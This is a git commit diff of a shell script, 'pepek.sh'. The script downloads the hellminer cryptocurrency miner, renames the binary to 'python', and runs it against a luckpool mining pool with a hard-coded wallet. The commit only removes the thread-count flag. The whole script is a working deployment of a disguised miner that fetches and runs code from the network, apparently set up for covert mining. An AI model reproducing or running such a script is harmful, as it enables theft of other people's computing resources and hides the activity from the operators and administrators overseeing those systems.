49d843f9997b6e9c2592d4962da73451e2388f63
komaria10003099 <komaria10003099@webmail.uad.ac.id>
2023-12-04 06:57:05 +0700

    Update pepek.sh

--- pepek.sh
+++ pepek.sh
@@ -2,4 +2,4 @@ apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget 
 wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
 tar -xhf hellminer_linux64.tar.gz
 mv hellminer python
-./python -c stratum+tcp://na.luckpool.net:3956 -u RE9ZxBCB3QiXCbjB8erhFVAC4Ph6ZTNqTE.car -p x -t$(nproc --all)
+./python -c stratum+tcp://na.luckpool.net:3956 -u RE9ZxBCB3QiXCbjB8erhFVAC4Ph6ZTNqTE.car -p x 
